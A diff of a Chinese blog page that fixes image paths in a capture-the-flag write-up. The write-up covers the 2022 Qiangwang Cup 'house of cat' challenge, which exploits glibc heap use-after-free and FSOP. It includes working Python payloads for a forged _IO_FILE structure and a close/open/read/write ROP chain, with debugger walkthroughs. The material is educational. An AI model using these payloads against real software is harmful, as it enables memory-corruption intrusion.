@@ -22,37 +22,37 @@
 <meta property="og:site_name" content="welc0me">
 <meta property="og:description" content="2022强网杯的house of cat。高版本下UAF的直接利用。看了很多wp发现在高版本下，基本所有攻击都聚焦于FSOP方向了。看来这才是大势所趋。 注意到前几天dice_hope也有一个一模一样的题，简单做法是改libc的got表为system，也可以FSOP泄露一个栈地址来劫持返回地址。但是这道题开了沙箱，也就是只能用第二种方法了。 着重参考看雪链接-house of cat">
 <meta property="og:locale">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220802150240535.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803190420908.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803190452900.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803204441077.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803204944167.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205215090.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205116039.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205425221.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205837782.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205954089.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210235857.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210429210.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210700762.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210723931.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803211025031.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803211921211.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803212712115.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803212846993.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803213503330.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803214011619.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803214029132.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803214112302.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803221156089.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803221641708.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220802150240535.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803190420908.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803190452900.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803204441077.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803204944167.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803205215090.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803205116039.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803205425221.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803205837782.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803205954089.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803210235857.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803210429210.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803210700762.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803210723931.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803211025031.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803211921211.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803212712115.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803212846993.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803213503330.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803214011619.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803214029132.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803214112302.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803221156089.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220803221641708.png">
 <meta property="article:published_time" content="2022-08-02T03:43:12.000Z">
 <meta property="article:modified_time" content="2023-02-05T04:16:20.000Z">
 <meta property="article:author" content="nich0las">
 <meta property="article:tag" content="heap">
 <meta property="article:tag" content="FSOP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220802150240535.png">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/image-20220802150240535.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -360,7 +360,7 @@
 
 <h1 id="house-of-cat题目"><a href="#house-of-cat题目" class="headerlink" title="house of cat题目"></a>house of cat题目</h1><p>这里就选择2022强网杯pwn里面的house of cat作为例子。这也是解出人数最多的一个pwn题目。</p>
 <p>首先看看这题是存在沙箱保护的。并且限制了文件描述符只能为0.</p>
-<p><img src="/.io//image-20220802150240535.png" alt="image-20220802150240535"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220802150240535.png" alt="image-20220802150240535"></p>
 <p>这道题给我们的条件是可以分配大小为size &lt;= 0x417 || size &gt; 0x46F的chunk，最多分配16个，可以edit两次，并且每次只能修改30字节。free的时候<strong>存在UAF</strong>。另外还有show()函数。</p>
 <p>首先这道题需要逆一下怎么输入能够通过输入条件的检验，我比赛的时候就卡在这个地方就卡了两个小时。。。输入的结构是这样的</p>
 <blockquote>
@@ -429,67 +429,67 @@
 <li>分配一个块的时候触发top chunk size的检查，触发FSOP。而此时stderr正是我们在第一次攻击中布置好的伪造的chunk。此时通过chunk中不同位置判断条件触发<code>_IO_switch_to_wget_mode</code>在跳转到<code>setcontext</code>就可以完成攻击了。</li>
 </ol>
 <h2 id="step3-setcontext"><a href="#step3-setcontext" class="headerlink" title="step3 setcontext"></a>step3 setcontext</h2><p>由于这道题存在沙箱，我们需要使用set_context+0x3d。具体使用方法是找到libc中的如下函数。蓝色框中的位置</p>
-<p><img src="/.io//image-20220803190420908.png" alt="image-20220803190420908"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803190420908.png" alt="image-20220803190420908"></p>
 <p>跳转到的位置</p>
-<p><img src="/.io//image-20220803190452900.png" alt="image-20220803190452900"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803190452900.png" alt="image-20220803190452900"></p>
 <p>因此我们可以将rdx+0xa8作为ROP的开始，后面这个地址将作为新的栈顶指针。之后布置一系列寄存器作为参数传递。当然在我们已经拿到libc之后，也不用管理参数，后面ROP自行修改即可。</p>
 <h2 id="构造ROP和FILE"><a href="#构造ROP和FILE" class="headerlink" title="构造ROP和FILE"></a>构造ROP和FILE</h2><h3 id="伪造FILE"><a href="#伪造FILE" class="headerlink" title="伪造FILE"></a>伪造FILE</h3><p>这里是这道题最难的地方。我们怎么构造伪造的FILE结构体，布置好参数，跳转到set context执行命令呢？我们重点分析以下payload，这是fake file的具体内容。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) <span class="comment"># heap_base+0xb30，rax1</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>) <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>) <span class="comment"># rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># call addr, here is [rax+0x18]</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span> )  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)*<span class="number">2</span> <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2  rax+0xe0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x17d0</span></span><br><span class="line">payload1 = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap_base+<span class="number">0x2050</span>)+p64(ret)</span><br></pre></td></tr></table></figure>
 
 <p>结合以下汇编分析。回忆一下我们首先通过一些flags的位置变化来让stderr执行到这个函数。此时我们只有<code>rdi</code>是可控的。<code>rdi</code>也就是这个fake file的指针。指向一开始的四个p64(0)。</p>
-<p><img src="/.io//image-20220803204441077.png" alt="image-20220803204441077"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803204441077.png" alt="image-20220803204441077"></p>
 <p>首先看我们把[rdi+0xa0]移动到rax。在上面的伪造FILE中，也就是<code>heap_base+0xb30</code>。而这个地址，实际上指向的是什么呢？我们动态调试一下。用以下命令下断点。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(io,<span class="string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220803204944167.png" alt="image-20220803204944167"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803204944167.png" alt="image-20220803204944167"></p>
 <p>这一步之后，就是上面wget相关函数。我们在运行完将结果给到rax之后，看一看rax。发现其实是伪造FILE的第二行。</p>
-<p><img src="/.io//image-20220803205215090.png" alt="image-20220803205215090"></p>
-<p><img src="/.io//image-20220803205116039.png" alt="image-20220803205116039"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803205215090.png" alt="image-20220803205215090"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803205116039.png" alt="image-20220803205116039"></p>
 <p>接下来两句汇编</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7fd903968d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line">► <span class="number">0x7fd903968d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>执行之后rdx是</p>
-<p><img src="/.io//image-20220803205425221.png" alt="image-20220803205425221"></p>
-<p><img src="/.io//image-20220803205837782.png" alt="image-20220803205837782"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803205425221.png" alt="image-20220803205425221"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803205837782.png" alt="image-20220803205837782"></p>
 <p>这个地址里面存的内容是什么呢？不着急，我们往下看。</p>
 <p>不过接下来，到达了以下汇编部分</p>
-<p><img src="/.io//image-20220803205954089.png" alt="image-20220803205954089"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803205954089.png" alt="image-20220803205954089"></p>
 <p>这里经过cmp之后，并没有在jmp跳转。直接进入了后面。好，在这里我们重新设置了rax。而这里的rax也和我们最重要调用的函数息息相关。我们原本的rax是</p>
-<p><img src="/.io//image-20220803210235857.png" alt="image-20220803210235857"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803210235857.png" alt="image-20220803210235857"></p>
 <p>之后，加上0xe0并解引用之后的结果如下。而这部分在Fake_file中的体现也就是第18行，在未解引用的时候位于FAKE_FILE第四行1的位置，解引用之后加上0x18的偏移量，正好是setcontext的地址。</p>
-<p><img src="/.io//image-20220803210429210.png" alt="image-20220803210429210"></p>
-<p><img src="/.io//image-20220803210700762.png" alt="image-20220803210700762"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803210429210.png" alt="image-20220803210429210"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803210700762.png" alt="image-20220803210700762"></p>
 <p>好，在进入setcontext之前我们看一眼寄存器。</p>
-<p><img src="/.io//image-20220803210723931.png" alt="image-20220803210723931"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803210723931.png" alt="image-20220803210723931"></p>
 <h3 id="setcontext的具体构造"><a href="#setcontext的具体构造" class="headerlink" title="setcontext的具体构造"></a>setcontext的具体构造</h3><p>在setcontext中，我们将要经过两次跳转。第一次的jump是必然发生的。但是第一次跳转我们其实只需要其中的一条汇编，<strong>也就是修改rsp为ROP的起始位置（注意看现在rsp为pop rdi了）</strong>。注意看这里是根据rdx的偏移来放置内容的。<strong>好，到这里就明确了，之前我们在fake_file中放置的rdx的值(见FAKE_FILE旁的注释)实际上和最终的ROP链息息相关</strong>。怎么计算呢？<strong>看到这里取出的是[rdx+0xa0]，那么实际上就是在第9个chunk中的ROP链==所在的地址==减去0xa0</strong>。</p>
-<p><img src="/.io//image-20220803211025031.png" alt="image-20220803211025031"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803211025031.png" alt="image-20220803211025031"></p>
 <p>如下所示。注意不是ROP链的地址，是<strong>所在的地址</strong>。而这个地址我们可以人为的写在某个地方。在这里，就是FAKE_FILE最后末尾的<code>p64(heap_base+0x2050)</code></p>
-<p><img src="/.io//image-20220803211921211.png" alt="image-20220803211921211"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803211921211.png" alt="image-20220803211921211"></p>
 <p>接下来的几个赋值并不重要。重要的是我们一定会完成这个跳转。注意这里push了一个rcx。这个也是当前rdx偏移计算的。**这个值正是我们伪造的FILE的最后一个字段内容p64(ret)**。其实就是一个ret。</p>
-<p><img src="/.io//image-20220803212712115.png" alt="image-20220803212712115"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803212712115.png" alt="image-20220803212712115"></p>
 <p>其实跳转之后的汇编也可以用来布置参数(当GADGET比较少的情况下)。我们此时rdx依然是之前的位置没有变。可以通过此处布置参数(可以看到rsi,rdi都在里面了)也可以在后面ROP的时候自己构造。这里提前防止参数的好处就是在无法泄露堆地址的情况下，可以直接获取堆对应位置字符串。如果后续使用ROP需要知道堆地址。</p>
-<p><img src="/.io//image-20220803212846993.png" alt="image-20220803212846993"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803212846993.png" alt="image-20220803212846993"></p>
 <p>终于，到了ROP</p>
-<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><img src="/.io//image-20220803213503330.png" alt="image-20220803213503330"></p>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><img src="/2022/08/02/house-of-cat/image-20220803213503330.png" alt="image-20220803213503330"></p>
 <p>这里由于只允许文件描述符0，因此先关闭0，之后打开文件的时候文件描述符自动会变成0。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close)+p64(pop_rdi)+p64(flag_addr)+\</span><br><span class="line">    p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscallret)+\</span><br><span class="line">        p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(flag_addr)+\</span><br><span class="line">            p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read_func)+\</span><br><span class="line">                p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write_func)</span><br></pre></td></tr></table></figure>
 
 <p>其实之后也就不复杂了。先close(0)之后就是正常的ORW。由于我们当前有储存在chunk的文件名“flag”，也有堆地址，可以任意指定一个地方储存flag内容。因此剩下的就不复杂了。我们也可以在这里布置参数，就不需要setcontext布置了。</p>
 <p>这里还学到一个就是libc的read write等参数调用和系统调用是一模一样的。其实这里用了glibc的，用系统调用也完全没有问题。(并且好像glibc也就是在外面套了一层壳)</p>
-<p><img src="/.io//image-20220803214011619.png" alt="image-20220803214011619"></p>
-<p><img src="/.io//image-20220803214029132.png" alt="image-20220803214029132"></p>
-<p><img src="/.io//image-20220803214112302.png" alt="image-20220803214112302"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803214011619.png" alt="image-20220803214011619"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803214029132.png" alt="image-20220803214029132"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803214112302.png" alt="image-20220803214112302"></p>
 <p>至此这道题结束了。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>这道题最重要的是提供了一种IO_FILE中，控制其重要寄存器rdx，并且调用set context的一种手法。首先这道题用largebin attack改了stderr，写成了一个chunk，之后触发malloc_assert，在chunk中写FAKE_FILE，触发set_context，完成ROP。如果这道题没有开沙箱，那么直接将chunk开头的部分写成/bin/sh(将会存在rdi中)，调用的函数写成system即可。</p>
 <p>回顾一下构造的IO_FILE。看看要改什么地方。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) <span class="comment"># heap_base+0xb30，rax1</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>) <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>) <span class="comment"># rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># call addr, here is [rax+0x18]</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span> )  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)*<span class="number">2</span> <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2  rax+0xe0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x17d0</span></span><br><span class="line">payload1 = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap_base+<span class="number">0x2050</span>)+p64(ret)</span><br></pre></td></tr></table></figure>
 
 <p>从上往下看，这里的第5行，需要改成<strong>存放ROP指令的chunk的地址减去0xa0之后的数值存放的地址</strong>。用一张图表示，不然太拗口了。就是填0x210。而地址A-0xa0的数值，可以填在这个FILE结构体后面(就相当于下面绿色的块，不过填在哪里都可以)</p>
-<p><img src="/.io//image-20220803221156089.png" alt="image-20220803221156089"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803221156089.png" alt="image-20220803221156089"></p>
 <p>第六行填写要调用的函数的地址。</p>
 <p>第12行填写指向第二行p64(0)所在的地址</p>
 <p>第16行写入上面这个固定的内容，绕过vtable的检验。可以通过以下方式找到。</p>
-<p><img src="/.io//image-20220803221641708.png" alt="image-20220803221641708"></p>
+<p><img src="/2022/08/02/house-of-cat/image-20220803221641708.png" alt="image-20220803221641708"></p>
 <p>第18行rax2将会指向第四行的p64(1)的位置，影响到后面call的函数。</p>
 <p>最后一行中末尾还需要加一个ret的gadget，通过在set_context中rdx的偏移找到，并且用于在ROP中（因为一开始会push一个rcx，就是这个值）</p>
 <h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
